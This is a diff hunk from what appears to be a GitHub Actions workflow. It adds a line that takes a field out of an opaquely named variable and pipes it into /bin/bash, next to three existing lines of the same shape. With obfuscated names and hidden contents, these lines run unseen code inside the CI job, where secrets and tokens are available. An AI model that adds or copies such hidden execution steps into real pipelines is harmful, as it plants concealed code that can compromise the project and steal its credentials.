@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$rnzmz21059" | jq -r .huuex700 | /bin/bash
           echo $wejk8251 | jq -r .gin03 | /bin/bash
           echo $ioo275 | jq -r .tftsi85 | /bin/bash
+          echo $b71 | jq -r .n1 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
